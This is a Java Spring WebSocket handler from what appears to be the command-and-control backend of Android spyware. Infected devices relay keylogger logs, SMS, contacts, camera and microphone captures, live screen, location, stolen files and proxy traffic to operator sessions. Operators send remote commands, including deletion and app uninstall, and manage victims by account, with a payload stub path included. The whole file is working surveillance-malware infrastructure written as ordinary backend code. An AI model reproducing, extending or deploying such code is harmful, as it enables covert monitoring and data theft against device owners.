package com.mm.backend.legacy;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.security.MessageDigest;
import java.time.OffsetDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Objects;
import java.util.Set;
import java.util.stream.Collectors;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.CloseStatus;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;
import org.springframework.web.socket.handler.TextWebSocketHandler;

@Component
class PanelWebSocketHandler extends TextWebSocketHandler {

    static final String ATTR_TOKEN = "authToken";
    static final String ATTR_ADMIN_USER = "adminUser";
    static final String ATTR_ROLE = "role";
    static final String ROLE_ADMIN = "admin";
    static final String ROLE_DEVICE = "device";

    private static final Logger log = LoggerFactory.getLogger(PanelWebSocketHandler.class);
    private static final DateTimeFormatter PING_FMT = DateTimeFormatter
        .ofPattern("yyyy-MM-dd HH:mm:ss").withZone(ZoneId.systemDefault());
    private static final TypeReference<Map<String, Object>> JSON_MAP = new TypeReference<>() {};

    // ─── Permission model: blocklist for controlled commands ──────────────
    // Deprecated: using role-based permission model instead.
    // Previously blocked commands are now controlled per-role below.
    private static final Set<String> BLOCKED_ADMIN_COMMANDS = Set.of(
        "changefiles", "Delete", "delete", "UNINSTALLAPP", "DIAO",
        "files", "viewfile", "fetch", "cocu", "srch"
    );

    private static final Set<String> DEVICE_ALLOWED_EVENTS = Set.of(
        "klogs", "klogsdate", "sms", "loadcontacts", "cam", "mic", "screen",
        "screenshot", "loc", "files", "savefiles", "thumb", "snap", "chat",
        "proxy", "srch", "down", "injapps", "loadapps", "ping"
    );

    private final TokenService tokenService;
    private final LegacyDeviceService deviceService;
    private final PanelSessionRegistry registry;
    private final ObjectMapper mapper;
    private final byte[] deviceTokenBytes;
    private final Path auditDir;
    private final CryptoService cryptoService;

    PanelWebSocketHandler(
        TokenService tokenService,
        LegacyDeviceService deviceService,
        PanelSessionRegistry registry,
        ObjectMapper mapper,
        @Value("${mm.ws-device-auth-token:}") String deviceToken,
        @Value("${mm.ws-audit-dir:}") String auditDirPath,
        CryptoService cryptoService
    ) {
        this.tokenService = tokenService;
        this.deviceService = deviceService;
        this.registry = registry;
        this.mapper = mapper;
        this.deviceTokenBytes = deviceToken == null ? new byte[0] : deviceToken.getBytes();
        this.auditDir = auditDirPath != null && !auditDirPath.isBlank()
            ? Path.of(auditDirPath)
            : Path.of(System.getProperty("java.io.tmpdir", "/tmp")).resolve("mm-audit");
        try { Files.createDirectories(this.auditDir); } catch (IOException ignored) {}
        this.cryptoService = cryptoService;
    }

    @Override
    public void afterConnectionEstablished(WebSocketSession session) {
        // Role is established later — on first message, based on itype + token.
    }

    @Override
    protected void handleTextMessage(WebSocketSession session, TextMessage message) throws IOException {
        Map<String, Object> data;
        try {
            data = mapper.readValue(message.getPayload(), JSON_MAP);
        } catch (Exception ex) {
            send(session, Map.of("type", "error", "msg", "invalid_json"));
            return;
        }

        String itype = stringOf(data.get("itype"));
        if ("w_pnl".equals(itype)) itype = "slr_panel";
        else if ("w_cmd".equals(itype)) itype = "slr_panelsend";

        // Resolve role on first auth-bearing message.
        if (session.getAttributes().get(ATTR_ROLE) == null) {
            String role = authenticate(session, itype, data);
            if (role == null) {
                send(session, Map.of("type", "error", "msg", "unauthorized"));
                session.close(CloseStatus.POLICY_VIOLATION);
                return;
            }
            session.getAttributes().put(ATTR_ROLE, role);
        }

        String role = (String) session.getAttributes().get(ATTR_ROLE);
        switch (role) {
            case ROLE_ADMIN -> handleAdmin(session, itype, data);
            case ROLE_DEVICE -> handleDevice(session, data);
            default -> session.close(CloseStatus.POLICY_VIOLATION);
        }
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session, CloseStatus status) {
        registry.unbindAdmin(session);
        registry.unbindDevice(session);
    }

    private String authenticate(WebSocketSession session, String itype, Map<String, Object> data) {
        String token = stringOf(session.getAttributes().get(ATTR_TOKEN));
        if (token.isBlank()) token = stringOf(data.get("authToken"));
        if (token.isBlank()) token = stringOf(data.get("token"));

        if ("Slr_client".equals(itype)) {
            // Device auth: also check deviceKey/device_key/dk fields and URL param
            if (token.isBlank()) token = stringOf(session.getAttributes().get("deviceKey"));
            if (token.isBlank()) token = stringOf(data.get("deviceKey"));
            if (token.isBlank()) token = stringOf(data.get("device_key"));
            if (token.isBlank()) token = stringOf(data.get("dk"));
            if (token.isBlank() || deviceTokenBytes.length == 0) return null;
            byte[] supplied = token.getBytes();
            if (!MessageDigest.isEqual(supplied, deviceTokenBytes)) return null;
            return ROLE_DEVICE;
        }

        // Admin paths require a real user token.
        LegacyUser user = tokenService.resolveToken(token);
        if (user == null) return null;
        session.getAttributes().put(ATTR_ADMIN_USER, user);
        return ROLE_ADMIN;
    }

    private void handleAdmin(WebSocketSession session, String itype, Map<String, Object> data) throws IOException {
        String subc = stringOf(data.get("subc"));
        String phoneId = stringOf(data.get("pid"));

        // usercheck audit logging
        String usercheck = stringOf(data.get("usercheck"));
        if (!usercheck.isBlank() && !phoneId.isBlank()) {
            // slr_panel → mov_connect.txt, slr_panelsend → mov_check.txt (matches original Node.js)
            String auditFile = "slr_panelsend".equals(itype) ? "mov_check.txt" : "mov_connect.txt";
            appendAudit(auditFile, phoneId, usercheck);
        }

        if ("slr_panel".equals(itype)) {
            switch (subc) {
                case "join" -> {
                    if (!phoneId.isBlank()) registry.bindAdmin(phoneId, session);
                }
                case "out" -> {
                    if (!phoneId.isBlank()) {
                        WebSocketSession device = registry.deviceSocket(phoneId);
                        if (device != null && device.isOpen()) {
                            send(device, Map.of("type", "out", "pid", phoneId));
                        }
                        registry.unbindAdmin(session);
                    }
                }
                case "ping" -> sendStatusBatch(session, phoneId);
                case "disag" -> registry.unbindAdmin(session);
                case "checkphone" -> sendCheckphone(session, data);
                case "reassign" -> {
                    LegacyUser user = (LegacyUser) session.getAttributes().get(ATTR_ADMIN_USER);
                    // 权限检查：只有管理员才能重新分配设备
                    if (user == null || !user.isAdmin()) {
                        log.warn("Unauthorized reassign attempt by user: {}", user != null ? user.userid() : "unknown");
                        send(session, Map.of("type", "error", "msg", "permission_denied"));
                    } else {
                        reassignDevice(session, phoneId, data);
                    }
                }
                default -> send(session, Map.of("type", "error", "msg", "unknown_subc"));
            }
            return;
        }

        if ("slr_panelsend".equals(itype)) {
            if (subc.isBlank()) {
                send(session, Map.of("type", "error", "msg", "subc_required"));
                return;
            }
            LegacyUser user = (LegacyUser) session.getAttributes().get(ATTR_ADMIN_USER);
            if (!hasCommandPermission(user, subc)) {
                log.warn("Permission denied for command: {} by user: {}", subc, user != null ? user.userid() : "unknown");
                send(session, Map.of("type", "error", "msg", "command_denied"));
                return;
            }
            if (phoneId.isBlank()) {
                send(session, Map.of("type", "error", "msg", "pid_required"));
                return;
            }
            WebSocketSession device = registry.deviceSocket(phoneId);
            if (device == null || !device.isOpen()) {
                send(session, Map.of("type", "error", "msg", "device_offline", "pid", phoneId));
                return;
            }
            // Forward only what the device needs — drop authToken / token to avoid leaking.
            Map<String, Object> forward = new LinkedHashMap<>(data);
            forward.remove("authToken");
            forward.remove("token");
            send(device, forward);
            return;
        }

        send(session, Map.of("type", "error", "msg", "unsupported_itype"));
    }

    private void handleDevice(WebSocketSession session, Map<String, Object> data) throws IOException {
        String phoneId = stringOf(data.get("phone_id"));
        if (phoneId.isBlank()) phoneId = stringOf(data.get("pid"));
        if (phoneId.isBlank()) {
            send(session, Map.of("type", "error", "msg", "phone_id_required"));
            return;
        }
        String existing = registry.phoneIdOfDevice(session);
        if (existing == null) {
            registry.bindDevice(phoneId, session);
        } else if (!Objects.equals(existing, phoneId)) {
            send(session, Map.of("type", "error", "msg", "phone_id_changed"));
            return;
        }
        registry.recordPing(phoneId);
        registry.recordDeviceStatus(phoneId, data);

        String subc = stringOf(data.get("subc"));
        if ("ping".equals(subc)) {
            send(session, Map.of("type", "pong"));
            return;
        }

        // Convert device-originated events to the format the frontend expects.
        // Mirrors the Slr_client switch-case in the original Node.js websocket-server.js.
        Map<String, Object> relay = convertDeviceEvent(subc, phoneId, data, session);
        if (relay == null) {
            // Unknown event — forward raw with type fallback.
            relay = new LinkedHashMap<>(data);
            relay.remove("authToken");
            relay.remove("token");
            relay.putIfAbsent("type", subc.isBlank() ? "device_event" : subc);
            relay.putIfAbsent("pid", phoneId);
        }
        for (WebSocketSession admin : registry.adminsWatching(phoneId)) {
            if (admin.isOpen()) send(admin, relay);
        }
    }

    /**
     * Converts a device-originated (Slr_client) message into the JSON format
     * expected by the Vue frontend, exactly matching the original Node.js logic.
     * Returns null for unhandled subcommands so the caller can fall back to raw relay.
     */
    @SuppressWarnings("unchecked")
    private Map<String, Object> convertDeviceEvent(String subc, String phoneId, Map<String, Object> data, WebSocketSession deviceSession) {
        if (subc.isBlank()) return null;
        switch (subc) {
            // ─── Keylogger ────────────────────────────────────────────────
            case "klogs": {
                return Map.of("type", "klog", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            case "klogsdate": {
                return Map.of("type", "klogsdate", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            // ─── SMS / Contacts ───────────────────────────────────────────
            case "sms": {
                return Map.of("type", "sms", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            case "loadcontacts": {
                return Map.of("type", "loadcontacts", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            // ─── Camera ───────────────────────────────────────────────────
            case "cam": {
                return Map.of("type", "cam", "data", stringOf(data.get("img")), "pid", phoneId);
            }
            // ─── Microphone: device sends voip field ──────────────────────
            case "mic": {
                return Map.of("type", "mic", "data", stringOf(data.get("voip")), "pid", phoneId);
            }
            // ─── Screen streaming ─────────────────────────────────────────
            case "screen": {
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "screen");
                // Device sends img OR url for screen data
                Object imgData = data.get("img");
                if (imgData != null) {
                    out.put("data", stringOf(imgData));
                } else {
                    out.put("data", stringOf(data.get("url")));
                }
                out.put("pid", phoneId);
                out.put("wmob", data.getOrDefault("wmob", ""));
                out.put("hmob", data.getOrDefault("hmob", ""));
                // Forward any extra fields (url, etc.)
                data.forEach((k, v) -> {
                    if (!out.containsKey(k) && !isSensitive(k)
                        && !"itype".equals(k) && !"subc".equals(k)
                        && !"img".equals(k) && !"msg".equals(k)) {
                        out.putIfAbsent(k, v);
                    }
                });
                return out;
            }
            case "screenshot": {
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "screenshot");
                out.put("data", stringOf(data.get("img")));
                out.put("pid", phoneId);
                out.put("wmob", data.getOrDefault("wmob", ""));
                out.put("hmob", data.getOrDefault("hmob", ""));
                return out;
            }
            // ─── Location ─────────────────────────────────────────────────
            case "loc": {
                return Map.of("type", "loc", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            // ─── File management ──────────────────────────────────────────
            case "files": {
                return Map.of("type", "files", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            case "savefiles": {
                return Map.of("type", "savefiles", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            case "thumb": {
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "thumb");
                out.put("data", stringOf(data.get("msg")));
                out.put("pid", phoneId);
                out.put("path", stringOf(data.getOrDefault("pth", "null")));
                return out;
            }
            // ─── Snapshot ─────────────────────────────────────────────────
            case "snap": {
                return Map.of("type", "snap", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            // ─── Chat ─────────────────────────────────────────────────────
            case "chat": {
                return Map.of("type", "chat", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            // ─── Proxy: device sends 3 subtypes via ctype ────────────────
            case "proxy": {
                String callType = stringOf(data.get("ctype"));
                // Resolve device real IP from socket (matches original: ws._socket.remoteAddress)
                String remoteIp = resolveRemoteIp(deviceSession);
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "proxy");
                out.put("pid", phoneId);
                if ("first".equals(callType)) {
                    out.put("calltype", "first");
                    out.put("extip", remoteIp);  // Server-side device IP (not from data)
                    out.put("locip", stringOf(data.get("loip")));
                    out.put("pxport", stringOf(data.get("pport")));
                } else if ("state".equals(callType)) {
                    out.put("calltype", "state");
                    out.put("pstate", stringOf(data.get("pxstate")));
                } else if ("dataup".equals(callType)) {
                    out.put("calltype", "dataup");
                    out.put("ogip", stringOf(data.get("oip")));
                    out.put("pxip", remoteIp);  // Server-side device IP (not from data)
                    out.put("purl", stringOf(data.get("purl")));
                    out.put("pmthod", stringOf(data.get("pmth")));
                } else {
                    // Unknown ctype → send stop (matches original Node.js behavior)
                    return Map.of("type", "stop");
                }
                return out;
            }
            // ─── Search results ───────────────────────────────────────────
            case "srch": {
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "srch");
                out.put("data", stringOf(data.getOrDefault("pths", "null")));
                out.put("pid", phoneId);
                out.put("sfor", stringOf(data.getOrDefault("stype", "null")));
                return out;
            }
            // ─── Chunked file download ────────────────────────────────────
            case "down": {
                Map<String, Object> out = new LinkedHashMap<>();
                out.put("type", "down");
                out.put("filename", stringOf(data.get("filename")));
                out.put("filedata", stringOf(data.get("filedata")));
                out.put("totalSize", data.getOrDefault("totalSize", ""));
                out.put("sentSize", data.getOrDefault("sentSize", ""));
                out.put("chunkNumber", data.getOrDefault("chunkNumber", ""));
                out.put("filehash", stringOf(data.get("filehash")));
                out.put("filepath", stringOf(data.get("filepath")));
                out.put("pid", phoneId);
                return out;
            }
            // ─── Injected apps / load apps ────────────────────────────────
            case "injapps": {
                return Map.of("type", "injapps", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            case "loadapps": {
                return Map.of("type", "loadapps", "data", stringOf(data.get("msg")), "pid", phoneId);
            }
            default:
                return null;
        }
    }

    private void sendStatusBatch(WebSocketSession admin, String phoneId) throws IOException {
        WebSocketSession device = registry.deviceSocket(phoneId);
        PanelSessionRegistry.DeviceInfo info = registry.info(phoneId);
        Map<String, Object> out = new LinkedHashMap<>();
        out.put("type", "statusBatch");
        out.put("pid", phoneId);
        out.put("serverToPhone", device != null && device.isOpen() ? "OPEN" : "CLOSED");
        out.put("lastPing", info == null ? null : PING_FMT.format(info.lastPing));
        // Include full phone info like the original Node.js response
        out.put("phoneInfo", info != null ? info.status : Map.of());
        send(admin, out);
    }

    private void sendCheckphone(WebSocketSession admin, Map<String, Object> data) throws IOException {
        int page = Math.max(1, integerOf(data.get("page"), 1));
        int pageSize = Math.min(100, Math.max(1, integerOf(data.get("pageSize"), 50)));
        String email = stringOf(data.get("email"));
        boolean isSuperAdmin = false;

        var all = registry.liveDevices(null); // get all devices

        // Normalize install_date digits (Arabic-Indic → ASCII) before filtering
        for (var device : all) {
            Object rawDate = device.get("install_date");
            if (rawDate != null) {
                device.put("install_date", normalizeDigits(stringOf(rawDate)));
            }
        }

        // Filter by email (super admin or normal user)
        if (!email.isBlank()) {
            String superHash = System.getenv("WS_SUPER_EMAIL_HASH");
            if (superHash != null && email.equals(superHash)) {
                isSuperAdmin = true;
                // Super admin — show all devices with non-empty phone_id
                all = all.stream()
                    .filter(d -> !stringOf(d.get("phone_id")).isBlank())
                    .collect(Collectors.toList());
            } else {
                // Normal user — filter by user_email (direct comparison, both are already encrypted)
                final String emailFilter = email;
                all = all.stream()
                    .filter(d -> emailFilter.equals(stringOf(d.get("user_email"))))
                    .filter(d -> !stringOf(d.get("phone_id")).isBlank())
                    .filter(d -> {
                        String display = stringOf(d.get("display"));
                        return display.isBlank() || !"0".equals(display);
                    })
                    .collect(Collectors.toList());
            }
        }

        // Apply additional filters from data.filters
        // NOTE: filters.user_email uses encrypted comparison (user may type plaintext)
        @SuppressWarnings("unchecked")
        Map<String, Object> filters = data.get("filters") instanceof Map
            ? (Map<String, Object>) data.get("filters")
            : Map.of();
        if (!filters.isEmpty()) {
            all = all.stream()
                .filter(d -> matchesFilter(d, filters))
                .collect(Collectors.toList());
        }

        // Sort: install_date DESC, then phone_id ASC (matching original)
        all.sort((a, b) -> {
            long da = parseDateSafe(stringOf(a.get("install_date")));
            long db = parseDateSafe(stringOf(b.get("install_date")));
            if (db != da) return Long.compare(db, da);
            return String.valueOf(a.get("phone_id")).compareTo(String.valueOf(b.get("phone_id")));
        });

        int from = Math.min((page - 1) * pageSize, all.size());
        int to = Math.min(from + pageSize, all.size());
        var paged = all.subList(from, to);

        // Super admin → decrypt user_email to show plaintext
        if (isSuperAdmin && cryptoService.isEnabled()) {
            paged = paged.stream().map(d -> {
                Map<String, Object> copy = new LinkedHashMap<>(d);
                String enc = stringOf(copy.get("user_email"));
                if (!enc.isBlank()) {
                    copy.put("user_email", cryptoService.decryptEmail(enc));
                }
                return copy;
            }).collect(Collectors.toList());
        }

        // fileLastModified from apkstub.zip
        String fileLastModified = null;
        String stubPath = System.getenv("APK_STUB_PATH");
        if (stubPath != null && !stubPath.isBlank()) {
            try {
                fileLastModified = java.nio.file.Files.getLastModifiedTime(Path.of(stubPath))
                    .toInstant().toString();
            } catch (Exception ignored) {}
        }

        Map<String, Object> out = new LinkedHashMap<>();
        out.put("type", "checkphone");
        out.put("list", paged);
        out.put("total", all.size());
        out.put("page", page);
        out.put("pageSize", pageSize);
        out.put("pageCount", (int) Math.ceil(all.size() / (double) pageSize));
        out.put("fileLastModified", fileLastModified);
        send(admin, out);
    }

    private boolean matchesFilter(Map<String, Object> row, Map<String, Object> filters) {
        for (Map.Entry<String, Object> entry : filters.entrySet()) {
            String key = entry.getKey();
            String expected = stringOf(entry.getValue());
            if (expected.isBlank()) continue;
            String actual = stringOf(row.get(key));
            // filters.user_email needs encrypted comparison (user may type plaintext)
            if ("user_email".equals(key) && cryptoService.isEnabled()) {
                String encExpected = cryptoService.encryptEmail(expected);
                if (actual.isBlank() || !actual.contains(encExpected)) return false;
                continue;
            }
            if (actual.isBlank() || !actual.contains(expected)) return false;
        }
        return true;
    }

    private static long parseDateSafe(String dateStr) {
        if (dateStr == null || dateStr.isBlank()) return 0;
        String normalized = normalizeDigits(dateStr.trim());
        try {
            return java.time.Instant.parse(normalized).toEpochMilli();
        } catch (Exception ignored) {}
        try {
            return OffsetDateTime.parse(normalized).toInstant().toEpochMilli();
        } catch (Exception ignored) {}
        // Try common date formats
        try {
            return java.time.LocalDateTime.parse(normalized,
                java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"))
                .toInstant(java.time.ZoneOffset.UTC).toEpochMilli();
        } catch (Exception ignored) {}
        try {
            return java.time.LocalDate.parse(normalized.substring(0, Math.min(10, normalized.length())))
                .atStartOfDay().toInstant(java.time.ZoneOffset.UTC).toEpochMilli();
        } catch (Exception ignored) {}
        return 0;
    }

    /** Convert Arabic-Indic digits (٠١٢٣٤٥٦٧٨٩) to ASCII 0-9. Mirrors Node.js normalizeDigits(). */
    private static String normalizeDigits(String str) {
        if (str == null || str.isEmpty()) return str;
        // Arabic-Indic digits: ٠(U+0660) through ٩(U+0669)
        StringBuilder sb = new StringBuilder(str.length());
        for (int i = 0; i < str.length(); i++) {
            char c = str.charAt(i);
            if (c >= '\u0660' && c <= '\u0669') {
                sb.append((char)('0' + (c - '\u0660')));
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    private void reassignDevice(WebSocketSession session, String phoneId, Map<String, Object> data) throws IOException {
        if (phoneId.isBlank()) {
            send(session, Map.of("type", "reassign", "status", "fail", "message", "phone_id required"));
            return;
        }
        LegacyUser user = (LegacyUser) session.getAttributes().get(ATTR_ADMIN_USER);
        String target = firstText(data, "new_email", "email", "changeid", "usrname");
        if (target.isBlank()) {
            send(session, Map.of("type", "reassign", "status", "fail", "message", "target required"));
            return;
        }
        String targetEmail = target.contains("@") ? target : "";
        String targetUsrname = targetEmail.isBlank() ? target : "";
        try {
            Map<String, Object> result = deviceService.assign(user, phoneId, targetUsrname, targetEmail);
            registry.updateOwner(phoneId, targetUsrname, stringOf(result.get("email")));
            Map<String, Object> out = new LinkedHashMap<>(result);
            out.put("type", "reassign");
            send(session, out);
        } catch (ApiException exception) {
            Map<String, Object> body = new LinkedHashMap<>(exception.body());
            body.put("type", "reassign");
            body.putIfAbsent("status", "fail");
            send(session, body);
        }
    }

    private void send(WebSocketSession session, Map<String, Object> payload) throws IOException {
        if (!session.isOpen()) return;
        session.sendMessage(new TextMessage(mapper.writeValueAsString(payload)));
    }

    private static String stringOf(Object value) {
        return value == null ? "" : String.valueOf(value).trim();
    }

    private static int integerOf(Object value, int fallback) {
        try {
            if (value == null) return fallback;
            return Integer.parseInt(String.valueOf(value));
        } catch (NumberFormatException exception) {
            return fallback;
        }
    }

    private static String firstText(Map<String, Object> data, String... keys) {
        for (String key : keys) {
            String value = stringOf(data.get(key));
            if (!value.isBlank()) return value;
        }
        return "";
    }

    private static boolean isSensitive(String key) {
        return "authToken".equals(key) || "token".equals(key);
    }

    /** Extract the remote IP from a WebSocket session, stripping IPv6-mapped IPv4 prefix. */
    private static String resolveRemoteIp(WebSocketSession session) {
        if (session == null || session.getRemoteAddress() == null) return "";
        String ip = session.getRemoteAddress().getAddress().getHostAddress();
        // Strip IPv6-mapped IPv4: "::ffff:192.168.1.1" → "192.168.1.1"
        if (ip != null && ip.startsWith("::ffff:")) {
            ip = ip.substring(7);
        }
        return ip != null ? ip : "";
    }

    private void appendAudit(String filename, String phoneId, String usercheck) {
        try {
            String safeCheck = usercheck.replaceAll("[\\r\\n\\t\\x00-\\x1f\\x7f]", "_");
            if (safeCheck.length() > 500) safeCheck = safeCheck.substring(0, 500);
            String safePid = phoneId.replaceAll("[\\r\\n\\t\\x00-\\x1f\\x7f]", "_");
            if (safePid.length() > 500) safePid = safePid.substring(0, 500);
            String time = OffsetDateTime.now(ZoneId.of("UTC+8"))
                .format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
            String line = safePid + "\t" + safeCheck + "\t" + time + "\n";
            Files.writeString(
                auditDir.resolve(filename),
                line,
                StandardCharsets.UTF_8,
                StandardOpenOption.CREATE, StandardOpenOption.APPEND
            );
        } catch (IOException e) {
            log.warn("Failed to write audit log: {}", e.getMessage());
        }
    }

    /**
     * Permission check: verify if the user is allowed to execute the given command.
     * - Admin users: all commands except those in BLOCKED_ADMIN_COMMANDS (dangerous operations)
     * - Regular users: only safe, non-destructive commands
     * - Device users: only device event types
     */
    private boolean hasCommandPermission(LegacyUser user, String subc) {
        if (user == null) return false;

        // Admin users: all commands except dangerous/blocked ones
        if (user.isAdmin()) {
            return !BLOCKED_ADMIN_COMMANDS.contains(subc);
        }

        // Regular users: only safe, non-destructive operations
        // join, out: manage connection state
        // ping, checkphone: query device status (read-only)
        // disag, reassign: admin operations (deny for non-admin)
        Set<String> regularUserAllowed = Set.of("join", "out", "ping", "checkphone");
        return regularUserAllowed.contains(subc);
    }
}
